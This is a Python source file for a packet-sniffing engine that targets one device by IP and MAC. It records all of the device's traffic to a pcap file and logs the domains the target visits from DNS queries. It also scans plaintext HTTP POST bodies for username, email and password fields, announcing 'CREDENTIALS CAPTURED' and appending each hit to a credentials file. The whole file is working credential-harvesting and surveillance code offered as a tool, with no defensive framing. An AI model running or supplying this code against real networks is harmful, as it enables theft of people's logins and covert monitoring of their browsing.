from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw, ICMP
import subprocess
import threading
import os
import re
import time
import uuid

class SnifferEngine:
    def __init__(self, interface, target_ip, target_mac, on_log, on_credential, on_traffic, on_packet):
        self.interface = interface
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.on_log = on_log
        self.on_credential = on_credential
        self.on_traffic = on_traffic
        self.on_packet = on_packet
        
        self.stop_event = threading.Event()
        self.thread = None
        self.tcpdump_proc = None
        
        self.log_dir = f"logs/{target_mac.replace(':', '_')}"
        os.makedirs(self.log_dir, exist_ok=True)
        self.pcap_path = os.path.join(self.log_dir, "capture.pcap")
        self.cred_path = os.path.join(self.log_dir, "credentials.txt")

        self.rx_bytes = 0
        self.tx_bytes = 0
        self.byte_lock = threading.Lock()

    def start(self):
        self.stop_event.clear()
        self.tcpdump_proc = subprocess.Popen(
            ["tcpdump", "-i", self.interface, "-w", self.pcap_path, f"host {self.target_ip}", "-U"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.on_log(f"[*] Sniffer started. Kernel-level PCAP saving to {self.pcap_path}")
        
        self.thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.thread.start()
        
        self.traffic_thread = threading.Thread(target=self._traffic_loop, daemon=True)
        self.traffic_thread.start()

    def stop(self):
        self.stop_event.set()
        if self.tcpdump_proc:
            self.tcpdump_proc.terminate()
            self.tcpdump_proc.wait()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2)
        self.on_log(f"[!] Sniffer stopped. Logs saved in {self.log_dir}")

    def _traffic_loop(self):
        while not self.stop_event.is_set():
            if self.stop_event.wait(1.0):
                break
                
            with self.byte_lock:
                rx_kb = round(self.rx_bytes / 1024, 1)
                tx_kb = round(self.tx_bytes / 1024, 1)
                self.rx_bytes = 0
                self.tx_bytes = 0
            self.on_traffic(rx_kb, tx_kb)

    def _sniff_loop(self):
        bpf_filter = f"host {self.target_ip}"
        sniff(
            iface=self.interface, 
            filter=bpf_filter, 
            prn=self._process_packet, 
            store=False, 
            stop_filter=lambda x: self.stop_event.is_set()
        )

    def _process_packet(self, packet):
        if self.stop_event.is_set():
            return

        if packet.haslayer(IP):
            pkt_len = len(packet)
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            with self.byte_lock:
                if dst_ip == self.target_ip:
                    self.rx_bytes += pkt_len
                elif src_ip == self.target_ip:
                    self.tx_bytes += pkt_len

            proto = "IP"
            src_port = ""
            dst_port = ""
            flags = ""
            
            if packet.haslayer(TCP):
                proto = "TCP"
                src_port = f":{packet[TCP].sport}"
                dst_port = f":{packet[TCP].dport}"
                flags = str(packet[TCP].flags)
            elif packet.haslayer(UDP):
                proto = "UDP"
                src_port = f":{packet[UDP].sport}"
                dst_port = f":{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                proto = "ICMP"
                
            pkt_data = {
                "id": str(uuid.uuid4()),
                "type": proto,
                "summary": f"[{proto}] {src_ip}{src_port} -> {dst_ip}{dst_port} ({pkt_len}B)",
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port.replace(":", ""),
                "dst_port": dst_port.replace(":", ""),
                "length": pkt_len,
                "flags": flags,
                "payload_ascii": "",
                "payload_hex": ""
            }

            if packet.haslayer(Raw):
                load = packet[Raw].load
                pkt_data["payload_ascii"] = load.decode('utf-8', errors='ignore')[:1000]
                pkt_data["payload_hex"] = load.hex()[:2000]

            self.on_packet(pkt_data)

        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            if packet[DNS].qr == 0:
                domain = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                if domain and not domain.endswith('.lan') and not domain.endswith('.local'):
                    self.on_log(f"[URL] Target visited: {domain}")

        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if "POST" in payload and ("pass" in payload.lower() or "user" in payload.lower() or "login" in payload.lower()):
                    self._extract_credentials(payload)
            except Exception as e:
                pass

    def _extract_credentials(self, payload):
        creds = []
        matches = re.findall(r'(\w+)=([^\s&]+)', payload)
        for key, value in matches:
            if any(word in key.lower() for word in ['user', 'name', 'email', 'login', 'pass', 'pwd', 'password']):
                creds.append(f"{key} = {value}")
        
        if creds:
            cred_str = "\n".join(creds)
            self.on_log(f"[!] CREDENTIALS CAPTURED: {cred_str}")
            self.on_credential(cred_str)
            try:
                with open(self.cred_path, "a") as f:
                    f.write(f"--- Captured {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n{cred_str}\n\n")
            except Exception as e:
                self.on_log(f"[-] Error saving credentials: {e}")